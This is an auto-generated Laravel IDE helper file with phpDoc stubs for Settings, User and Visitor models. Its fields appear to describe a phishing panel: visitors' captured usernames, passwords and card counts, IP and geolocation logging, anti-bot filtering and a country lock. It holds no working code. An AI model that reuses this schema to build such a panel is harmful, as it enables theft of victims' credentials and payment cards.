<?php

// @formatter:off
// phpcs:ignoreFile
/**
 * A helper file for your Eloquent Models
 * Copy the phpDocs from this file to the correct Model,
 * And remove them from this file, to prevent double declarations.
 *
 * @author Barry vd. Heuvel <barryvdh@gmail.com>
 */


namespace App\Models{
/**
 * @property int $id
 * @property string $admin_panel
 * @property string $username
 * @property string $password
 * @property int $lock_brazil
 * @property \self|null $stopbot
 * @property string $email_result
 * @property bool $redirect_on_finish
 * @property bool $double_cards
 * @property string|null $parameter
 * @property string $external_redirect
 * @property \Illuminate\Support\Carbon|null $created_at
 * @property \Illuminate\Support\Carbon|null $updated_at
 * @property string|null $ipify_key
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings query()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereAdminPanel($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereDoubleCards($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereEmailResult($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereExternalRedirect($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereIpifyKey($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereLockBrazil($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereParameter($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings wherePassword($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereRedirectOnFinish($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereStopbot($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereUpdatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Settings whereUsername($value)
 */
	class Settings extends \Eloquent {}
}

namespace App\Models{
/**
 * @property int $id
 * @property string $name
 * @property string $email
 * @property string $username
 * @property string $password
 * @property \Illuminate\Support\Carbon|null $email_verified_at
 * @property string|null $remember_token
 * @property \Illuminate\Support\Carbon|null $created_at
 * @property \Illuminate\Support\Carbon|null $updated_at
 * @property-read \Illuminate\Notifications\DatabaseNotificationCollection<int, \Illuminate\Notifications\DatabaseNotification> $notifications
 * @property-read int|null $notifications_count
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User query()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereEmail($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereEmailVerifiedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereName($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User wherePassword($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereRememberToken($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereUpdatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|User whereUsername($value)
 */
	class User extends \Eloquent {}
}

namespace App\Models{
/**
 * @property int $id
 * @property string|null $user
 * @property string|null $pass
 * @property int $card_count
 * @property bool $is_finished
 * @property \App\Enums\ParameterStatus $parameter_status
 * @property $stopbot_response
 * @property \WhichBrowser\Parser $browser
 * @property \App\Enums\UserType $user_type
 * @property string $isp
 * @property string $city
 * @property string $state
 * @property string $country
 * @property string $ip_address
 * @property string $user_agent
 * @property string $first_page
 * @property string $last_page
 * @property \Illuminate\Support\Carbon|null $created_at
 * @property \Illuminate\Support\Carbon|null $updated_at
 * @property bool $is_blocked
 * @property \App\Enums\AntibotStatus $antibot_status
 * @property-read bool $page_finished
 * @property-read string $visitor_details
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor query()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereBrowser($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereCardCount($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereCity($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereCountry($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereFirstPage($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereIpAddress($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereIsBlocked($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereIsFinished($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereIsp($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereLastPage($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereParameterStatus($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor wherePass($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereState($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereStopbotResponse($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereUpdatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereUser($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereUserAgent($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|Visitor whereUserType($value)
 */
	class Visitor extends \Eloquent {}
}

